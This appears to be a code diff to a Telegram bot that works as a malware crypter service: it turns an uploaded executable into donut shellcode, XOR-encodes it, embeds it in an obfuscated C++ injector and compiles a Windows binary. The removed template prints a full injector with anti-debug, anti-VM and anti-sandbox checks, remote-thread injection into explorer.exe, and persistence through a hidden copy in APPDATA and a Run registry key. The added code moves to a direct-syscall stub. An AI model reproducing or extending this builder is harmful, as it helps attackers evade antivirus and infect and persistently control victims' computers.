@@ -9,6 +9,7 @@ import warnings
 from telegram.warnings import PTBUserWarning
 import pytz
 import random
+import shutil
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 from utils.obf import run_obfuscation
 from telegram.ext import (
@@ -393,6 +394,8 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     query = update.callback_query
     await query.answer()
 
+    # The new stub does not have a startup/persistence option.
+    # This choice is now effectively ignored, but we keep the conversation flow.
     startup = query.data == 'startup_yes'
 
     input_path = context.user_data.get('input_path')
@@ -405,232 +408,89 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     uid = query.from_user.id
     udir = user_stub_dir(uid)
-    cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
-    obfuscated_cpp_path = os.path.join(udir, f"obfuscated_{uid}.cpp")
+
+    # Define paths for the new stub files
+    injector_cpp_path = os.path.join(udir, "injector.cpp")
+    syscalls_h_path = os.path.join(udir, "syscalls.h")
+    syscalls_cpp_path = os.path.join(udir, "syscalls.cpp")
+    obfuscated_injector_path = os.path.join(udir, f"obfuscated_injector_{uid}.cpp")
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
     try:
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
+        # Copy syscall files to user's temp directory
+        shutil.copy("new_Stub/syscalls.h", syscalls_h_path)
+        shutil.copy("new_Stub/syscalls.cpp", syscalls_cpp_path)
+
+        # Generate shellcode
         shellcode_bytes = donut.create(file=input_path)
 
         # --- Obfuscation & Splitting ---
         xor_key = random.randint(1, 255)
-        chunk_size = 200  # Number of bytes per chunk
-
+        chunk_size = 200
         chunks = [shellcode_bytes[i:i + chunk_size] for i in range(0, len(shellcode_bytes), chunk_size)]
-
-        obfuscated_chunks = []
-        for chunk in chunks:
-            obfuscated_chunks.append(bytes([b ^ xor_key for b in chunk]))
+        obfuscated_chunks = [bytes([b ^ xor_key for b in chunk]) for chunk in chunks]
 
         # --- C++ Code Generation ---
+        # Read the new injector template
+        with open("new_Stub/injector.cpp", "r", encoding="utf-8") as f:
+            injector_content = f.read()
+
+        # Prepare the dynamic shellcode data block
         cpp_shellcode_definitions = ""
         for i, chunk in enumerate(obfuscated_chunks):
-            hex_str = ", ".join([f"(char)0x{b:02x}" for b in chunk])
-            cpp_shellcode_definitions += f"char chunk_{i}[] = {{ {hex_str} }};\n"
+            hex_str = ", ".join([f"0x{b:02x}" for b in chunk])
+            cpp_shellcode_definitions += f"unsigned char chunk_{i}[] = {{ {hex_str} }};\n"
 
-        cpp_chunk_pointers = ", ".join([f"(unsigned char*)chunk_{i}" for i in range(len(chunks))])
+        cpp_chunk_pointers = ", ".join([f"chunk_{i}" for i in range(len(chunks))])
         cpp_chunk_sizes = ", ".join([str(len(chunk)) for chunk in chunks])
 
-        startup_macro = "#define StartUP true" if startup else "#define StartUP false"
-
-        cpp_template = f'''
-// Anti-forensics headers. anti_vm.h must be first to ensure winsock2.h is included before windows.h
-#include "anti_vm.h"
-
-// Undefine __cpuid to prevent conflict between <cpuid.h> (from anti_vm) and <intrin.h> (from anti_debug)
-#if defined(__GNUC__) && defined(__cpuid)
-#undef __cpuid
-#endif
-
-#include "anti_debug.h"
-#include "anti_sandbox.h"
-
-#include <windows.h>
-#include <iostream>
-#include <vector>
-#include <string>
-#include <tlhelp32.h>
-#include <stdlib.h>
-
-{startup_macro}
-
+        shellcode_data_replacement = f"""
 // --- Shellcode Data ---
 {cpp_shellcode_definitions}
-
 unsigned char* shellcode_chunks[] = {{ {cpp_chunk_pointers} }};
 size_t chunk_sizes[] = {{ {cpp_chunk_sizes} }};
 const int num_chunks = {len(chunks)};
 const unsigned char xor_key = {xor_key};
 // --- End Shellcode Data ---
+"""
+        # Find the placeholder block and replace it
+        start_marker = "// --- Shellcode Data (Dummy Placeholder) ---"
+        end_marker = "// --- End Shellcode Data ---"
+        start_index = injector_content.find(start_marker)
+        end_index = injector_content.find(end_marker)
 
+        if start_index == -1 or end_index == -1:
+             await edit_message(query, "Error: Could not find shellcode placeholder in the stub.", None)
+             return ConversationHandler.END
 
-bool RegisterSystemTask(const std::string& executablePath) {{
-    HKEY hKey;
-    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
-    const char* valueName = "SystemCoreService";
+        # Reconstruct the template with the dynamic shellcode
+        cpp_template = injector_content[:start_index] + shellcode_data_replacement + injector_content[end_index + len(end_marker):]
 
-    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
-    if (openRes != ERROR_SUCCESS) {{
-        return false;
-    }}
-
-    LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
-    if (setRes != ERROR_SUCCESS) {{
-        RegCloseKey(hKey);
-        return false;
-    }}
-
-    RegCloseKey(hKey);
-    return true;
-}}
-
-enum RelocateResult {{
-    RELOCATE_SUCCESS,
-    RELOCATE_ALREADY_EXISTS,
-    RELOCATE_FAILED
-}};
-
-RelocateResult RelocateModule(std::string& newPath) {{
-    char currentPath[MAX_PATH];
-    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
-
-    const char* appDataPath = getenv("APPDATA");
-    if (appDataPath == NULL) {{
-        return RELOCATE_FAILED;
-    }}
-
-    newPath = std::string(appDataPath) + "\\\\services.exe";
-
-    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) {{ // TRUE = bFailIfExists
-        DWORD error = GetLastError();
-        if (error == ERROR_FILE_EXISTS) {{
-            return RELOCATE_ALREADY_EXISTS;
-        }} else {{
-            return RELOCATE_FAILED;
-        }}
-    }}
-
-    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
-    return RELOCATE_SUCCESS;
-}}
-
-DWORD FindTargetProcess(const std::string& processName) {{
-    PROCESSENTRY32 entry;
-    entry.dwSize = sizeof(PROCESSENTRY32);
-
-    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) {{
-        return 0;
-    }}
-
-    if (Process32First(snapshot, &entry) == TRUE) {{
-        while (Process32Next(snapshot, &entry) == TRUE) {{
-            if (_stricmp(entry.szExeFile, processName.c_str()) == 0) {{
-                CloseHandle(snapshot);
-                return entry.th32ProcessID;
-            }}
-        }}
-    }}
-
-    CloseHandle(snapshot);
-    return 0;
-}}
-
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
-    if (CheckForDebugger() || AntiVM::isVM() || AntiSandbox::check_cpuid() || AntiSandbox::check_timing() || AntiSandbox::check_ram() || AntiSandbox::check_mac_address() || AntiSandbox::check_hardware_names() || AntiSandbox::check_linux_artifacts() || AntiSandbox::check_registry_keys() || AntiSandbox::check_vm_files() || AntiSandbox::check_running_processes()) {{
-        return 1;
-    }}
-
-    // --- De-obfuscate and Reassemble Shellcode ---
-    size_t total_size = 0;
-    for (int i = 0; i < num_chunks; ++i) {{
-        total_size += chunk_sizes[i];
-    }}
-
-    std::vector<unsigned char> shellcode_buffer;
-    shellcode_buffer.reserve(total_size);
-
-    for (int i = 0; i < num_chunks; ++i) {{
-        for (size_t j = 0; j < chunk_sizes[i]; ++j) {{
-            shellcode_buffer.push_back(shellcode_chunks[i][j] ^ xor_key);
-        }}
-    }}
-    // --- End De-obfuscation ---
-
-    DWORD pid = FindTargetProcess("explorer.exe");
-    if (pid == 0) {{
-        return 1;
-    }}
-
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-    if (hProcess == NULL) {{
-        return 1;
-    }}
-
-    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, shellcode_buffer.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (pRemoteAddress == NULL) {{
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode_buffer.data(), shellcode_buffer.size(), NULL)) {{
-        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
-    if (hThread == NULL) {{
-        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
-        CloseHandle(hProcess);
-        return 1;
-    }}
-
-    CloseHandle(hThread);
-    CloseHandle(hProcess);
-
-#if StartUP
-    // --- Persistence Logic ---
-    std::string newPath;
-    RelocateResult relocateResult = RelocateModule(newPath);
-
-    if (relocateResult == RELOCATE_SUCCESS) {{
-        if (!RegisterSystemTask(newPath)) {{
-            // Persistence failed, but payload delivered.
-        }}
-    }}
-#endif
-
-    return 0;
-}}
-'''
-        with open(cpp_file_path, "w", encoding="utf-8") as f:
+        with open(injector_cpp_path, "w", encoding="utf-8") as f:
             f.write(cpp_template)
 
-        # Obfuscate the C++ file
+        # Obfuscate the main injector C++ file
         try:
             await edit_message(query, "Obfuscating source code...", None)
-            run_obfuscation(cpp_file_path, obfuscated_cpp_path)
+            run_obfuscation(injector_cpp_path, obfuscated_injector_path)
         except Exception as e:
             await edit_message(query, f"An error occurred during obfuscation: {e}", None)
             return ConversationHandler.END
 
-        # Compile the obfuscated C++ file
+        # Compile the obfuscated injector and the syscalls implementation
         await edit_message(query, "Compiling your file...", None)
         compile_result = subprocess.run(
-            ["g++", obfuscated_cpp_path, "-o", compiled_exe_path, "-static", "-O2", "-s", "-mwindows", "-w", "-lshlwapi", "-liphlpapi", "-Iincludes"],
+            ["g++", obfuscated_injector_path, syscalls_cpp_path, "-o", compiled_exe_path, "-static", "-O2", "-s", "-mwindows", "-w"],
             capture_output=True, text=True,
         )
 
         if compile_result.returncode != 0:
             error_msg = f"Compilation Error:\n{compile_result.stderr}"
             print(f"Compilation failed for user {uid}:\n{error_msg}")
-
             if len(error_msg) > 4000:
                 error_msg = error_msg[:4000] + "\n...(truncated)"
-
             await edit_message(query, error_msg, None)
             return ConversationHandler.END
 
@@ -648,7 +508,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     finally:
         # Clean up all temporary files
-        for path in [input_path, cpp_file_path, obfuscated_cpp_path, compiled_exe_path]:
+        paths_to_clean = [
+            input_path, injector_cpp_path, syscalls_h_path,
+            syscalls_cpp_path, obfuscated_injector_path, compiled_exe_path
+        ]
+        for path in paths_to_clean:
             if path and os.path.exists(path):
                 os.remove(path)
         context.user_data.clear()
